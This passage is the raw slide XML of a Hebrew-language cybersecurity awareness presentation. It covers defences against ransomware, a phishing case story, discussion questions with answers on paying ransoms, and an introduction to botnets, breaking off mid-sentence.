        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="5501656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DA124F-0344-4E87-9816-775E97FF123D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3031434" y="642594"/>
            <a:ext cx="8093765" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>איך ניתן להגן מפני תוכנות כופר?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4DF2FADF-A914-4FB0-85FB-7F947666F621}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>גיבויים שוטפים:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שמור גיבויים עדכניים של כל הקבצים החשובים. כך, במקרה של התקפה, תוכל לשחזר את המערכת מבלי לשלם כופר.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>עדכוני תוכנה:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> עדכן את מערכת ההפעלה והתוכנות שלך באופן קבוע כדי לסגור חולשות אבטחה שהתוקפים עלולים לנצל.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>אנטי-וירוס ואנטי-מלקוד:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> התקן ושמור על תוכנות אנטי-וירוס ואנטי-מלקוד עדכניות שמסוגלות לזהות ולהסיר איומים פוטנציאליים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>זהירות מאימיילים חשודים:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> אל תפתח קבצים מצורפים או לחץ על קישורים באימיילים לא מוכרים או חשודים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>5. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הדרכת עובדים:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> אם אתה בארגון, הדרכת עובדים לזהות ולהימנע ממיילים חשודים יכולה למנוע הרבה התקפות.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="27290140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2A3CBFC-2469-491A-B14A-AC466FEBA487}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5277678" y="642594"/>
            <a:ext cx="5847522" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>סיפור מהעולם </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>האמיתי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{23BCB691-FDAA-4AE6-A0B5-8011EDA10904}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בחברת טרנספורט בינלאומית, מנהל ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IT </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> קיבל מייל שנראה כאילו הוא הגיע ממנכ"ל החברה, עם קובץ מצורף שנראה כחשוב. לאחר שפתח את הקובץ, כל הרשת של החברה ננעלה על ידי תוכנת כופר. הנזק היה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>מיידי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> והחברה נאלצה לשלם כופר של 300 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>ביטקוין</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי לשחרר את המידע שלהם. המנהל הבין מאוחר מדי שלא מדובר במייל </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>אמיתי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מהמנכ"ל, אלא במתקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פישינג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מתוחכמת.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1252759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6CF8D1F-64EE-44BC-B51B-72CDEC3CC6B9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9144000" y="642594"/>
            <a:ext cx="1981200"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254DFBCB-43EA-41C2-9259-555B5368B1DE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. מה ההבדל בין תוכנת כופר לתוכנה זדונית רגילה?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. כיצד תוכל להקטין את הסיכון להידבק בתוכנת כופר?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. האם לדעתך כדאי לשלם את הכופר במקרה של התקפה? למה כן או לא?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="32358507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3FE38B0-704B-440E-A7EB-9A0B5BC9CFCF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9024730" y="642594"/>
            <a:ext cx="2100470" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תשובות:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A45C8AD7-FC1D-489D-B3B7-7D09C9F4FAEE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>תוכנה זדונית רגילה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Malware </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>היא שם כולל לכל סוגי התוכנות המזיקות שמשפיעות לרעה על מערכות מחשוב. היא יכולה לכלול וירוסים, תולעים, סוסים טרויאניים, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>רוגלות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ועוד. כל אחת מתוכנות אלו יכולה לגרום לנזק בצורות שונות, כמו גניבת מידע, השחתת קבצים, או השתלטות על מערכת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>תוכנת כופר</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Ransomware</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>היא סוג ספציפי של תוכנה זדונית. המטרה העיקרית שלה היא להצפין את הקבצים במערכת הקורבן ולדרוש תשלום כופר בתמורה למפתח ההצפנה שיאפשר לשחרר את הקבצים. מה שמייחד את תוכנת הכופר הוא הדרישה לתשלום בתמורה לשחרור הגישה לקבצים הנעולים.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="31975186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7BECB9-EBDA-4FE8-B1F9-18094E508DF1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6987208" y="642594"/>
            <a:ext cx="4137991" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - תשובות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1ED86E00-8249-4424-9C87-6255ADAB8B11}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>   א. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>גיבויים סדירים:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ביצוע גיבויים תקופתיים של הקבצים החשובים ושמירתם במקום בטוח, מנותק מהרשת, יכולה להקטין את הנזק במקרה של התקפה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>   ב. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>עדכוני תוכנה:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> עדכון תדיר של מערכת ההפעלה, דפדפנים, ותוכנות אחרות כדי לסגור פרצות אבטחה שמנוצלות על ידי תוכנות כופר.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>   ג. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>אנטי-וירוס ואנטי-מלקוד:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שימוש בתוכנות אנטי-וירוס ואנטי-מלקוד עדכניות כדי לזהות ולחסום תוכנות כופר לפני שהן נזקקות למערכת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>   ד. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>זהירות עם מיילים וקישורים:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הימנעות מפתיחת קבצים מצורפים וקישורים ממקורות לא אמינים, ובמיוחד ממיילים שמגיעים מכתובות לא מוכרות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>   ה. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הגברת מודעות:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> לימוד ושיפור המודעות של עצמך ושל משתמשים אחרים ברשת לסיכונים של תוכנות כופר, כולל הכרת סימנים מעידים </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>לפישינג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> והתקפות אחרות.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10819270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B8510E-0295-41D8-979A-795B5AF9B4D8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6957391" y="334481"/>
            <a:ext cx="4167809" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - תשובות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CB1D4235-F936-417E-BEE5-EEBDD5760B00}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1510748"/>
            <a:ext cx="10058400" cy="4524292"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>למה לא כדאי לשלם:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>   א. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>אין אחריות:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> אין שום ערובה לכך שהתוקפים אכן ישחררו את הקבצים לאחר קבלת הכופר. לפעמים הקורבנות לא מקבלים את מפתח ההצפנה גם אחרי תשלום.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>   ב. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>עידוד הפשע:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> תשלום הכופר מעודד את התוקפים להמשיך בפעילותם, שכן הם רואים בכך דרך רווחית.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>   ג. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מימון פעילות עבריינית:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> תשלום כופר יכול לסייע במימון פעילויות עברייניות נוספות, כמו טרור או פשיעה מאורגנת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>למה כן כדאי לשלם (במקרים חריגים בלבד):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>   א. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שחזור מידע קריטי:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> במקרים שבהם אין גיבויים ואין דרך אחרת לשחזר מידע קריטי עבור הארגון או האדם הפרטי, יש כאלו ששוקלים לשלם כדי לקבל את המידע בחזרה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>   ב.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> מזעור נזק:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> במקרים מסוימים, תשלום הכופר עלול להיות הדרך היחידה להחזיר את העסק לפעילות במהירות ולמזער את הנזקים הכלכליים והמבצעיים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לרוב, ההמלצה היא </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>לא לשלם את הכופר</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ולנסות לשחזר את המידע מגיבויים או להשתמש בשירותי שחזור מקצועיים. חשוב גם לדווח לרשויות ולחפש פתרונות אחרים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="24386384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FAF700BA-A1F9-4DF6-931E-368AED22E1AA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2242267"/>
            <a:ext cx="10058400" cy="3931920"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="he-IL" sz="8800" dirty="0"/>
              <a:t>רשת בוטים</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33886805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90C1BF2-BB47-484C-A5FD-B061EA195A8F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6848060" y="642594"/>
            <a:ext cx="4277139" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מהי רשת בוטים?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F90C8BA3-9717-45E8-BC1D-AAF41A55B458}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>רשת בוטים </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Botnet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> היא קבוצה של מחשבים או מכשירים מחוברים לאינטרנט שנפגעו מתוכנה זדונית והפכו להיות "בוטים". המונח "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>בוט</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>" הוא קיצור של "רובוט", ומשמש לתיאור מחשבים שנשלטים מרחוק על ידי תוקף.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הבוטים ברשת הבוטים יכולים לבצע פעולות מתואמות ונשלטות מרחוק על ידי התוקף (נקרא גם </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Botmaster</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> רשתות בוטים משמשות לרוב לתקיפות סייבר מאורגנות, כמו הפצת דואר זבל </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Spam</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ביצוע התקפות מניעת שירות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DDoS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> גניבת מידע אישי, כריית מטבעות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>קריפטוגרפיים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ועוד.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="37782254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9E6EF20-4990-434A-8A48-A8FC9CE6E774}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5416826" y="413994"/>
            <a:ext cx="5708374" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>איך רשת בוטים נבנית?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{673901B0-C5DA-4612-9914-F1075B6C3C07}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1785594"/>
            <a:ext cx="10058400" cy="4863683"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הדבקת המחשבים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התוקף מפיץ תוכנה זדונית</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Malware </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> באמצעות דוא"ל </a:t>
            </a:r>
